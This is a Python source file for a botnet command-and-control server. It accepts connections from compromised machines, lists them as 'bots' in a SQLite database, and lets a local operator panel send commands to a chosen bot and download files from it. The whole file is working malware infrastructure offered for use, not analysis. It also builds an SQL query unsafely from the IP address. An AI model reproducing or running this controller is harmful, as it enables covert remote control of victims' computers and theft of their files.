import socket
import os
import threading
import sqlite3

socket_host = "0.0.0.0"
socket_port = 5002


class SocketServer:
    def __new__(cls, *args, **kwargs) -> None:
        raise 'You cannot create object from this class'

    host = socket_host
    port = socket_port
    online_bots = {}
    current_socket = None
    current_ip = None
    header_size = 10

    @staticmethod
    def create_bot(ip):
        try:
            con = sqlite3.connect("database/database.db")
            cur = con.cursor()
            bot = cur.execute(f"SELECT ip FROM bots WHERE ip='{ip}'").fetchone()
            if bot:
                return
            else:
                if not os.path.exists('bots/{ip}'):
                    os.mkdir(f'bots/{ip}')
                data = cur.execute(f"SELECT * FROM bots").fetchall()
                id = data[-1][0] + 1 if data else 1
                ip = (id, ip, 0, 0)
                cur.execute("INSERT INTO bots VALUES (?,?,?,?)", ip)
            con.commit()
            cur.close()
            con.close()
        except:
            print('DataBase error')

    @staticmethod
    def make_message(msg: str, style="") -> str:
        return f"<span class='{style}'>{msg}</span>"

    @classmethod
    def get_bot_list(cls) -> list:
        return [ip for ip in cls.online_bots.keys()]

    @classmethod
    def run_socket_server(cls) -> None:
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.bind((cls.host, cls.port))
        server.listen(5)
        print("Socket server is running")

        while True:
            client, address = server.accept()
            print(address[0], "is accepted")
            client.settimeout(8)
            if address[0] == '127.0.0.1':
                panel = threading.Thread(target=cls.__handle_panel_command, args=(client,), daemon=True)
                panel.start()
            else:
                cls.online_bots.update({address[0]: client})
                cls.create_bot(address[0])

    @classmethod
    def __handle_panel_command(cls, client):
        msg = client.recv(1024).decode('utf-8')
        download = False
        if "download" in msg:
            download = True
            filename = msg.replace("download", "").strip()
        response = cls.__local_command_execute(msg)
        if response:
            client.send(bytes(response, "utf-8"))
            client.close()
        else:
            if not cls.current_socket:
                client.send(bytes("You are not connect to any bot", "utf-8"))
                client.close()
            else:
                msg = f"{len(msg):<{cls.header_size}}" + msg
                cls.current_socket.send(bytes(msg, "utf-8"))
                full_msg = ''
                new_msg = True
                while True:
                    msg = cls.current_socket.recv(16)
                    if new_msg:
                        msg_len = int(msg[:cls.header_size])
                        new_msg = False
                    full_msg += msg.decode("utf-8")
                    if len(full_msg) - cls.header_size == msg_len:
                        msg = full_msg[cls.header_size:]

                        if download:
                            if not os.path.exists(f'bots/{cls.current_ip}'):
                                os.mkdir(f'bots/{cls.current_ip}')
                            file = open(f'bots/{cls.current_ip}/{filename}', 'wb')
                            file.write(msg.encode())
                            file.close()
                            client.send(bytes("File was download", "utf-8"))
                        else:
                            client.send(bytes(msg, "utf-8"))
                        client.close()
                        break

    @classmethod
    def __local_command_execute(cls, command) -> str:
        if len(command.split()) == 2 and command.split()[0] == 'connect':
            if command.split()[1] in cls.get_bot_list():
                cls.current_socket = cls.online_bots[command.split()[1]]
                cls.current_ip = command.split()[1]
                return "Connected"
            else:
                return "This bot not found or offline"
        elif command == "disconnect":
            cls.current_socket.close()
            cls.current_socket = None
            cls.current_ip = None
            return "Disconnected"
        elif command == "show":
            if cls.current_socket:
                return "You connected to bot"
            else:
                return str(cls.get_bot_list() or 'No one bot')
        elif command == "reload":
            if cls.current_socket:
                return 'Firstly you have to disconnect.'
            else:
                for bot in cls.online_bots.values():
                    bot.close()
                return 'Listener was reload'
        elif command == "check_bot_online":
            return str(cls.get_bot_list()) or "No one bot"
        return ""


if __name__ == "__main__":
    try:
        SocketServer.run_socket_server()
    except OSError:
        print('Port already in use')
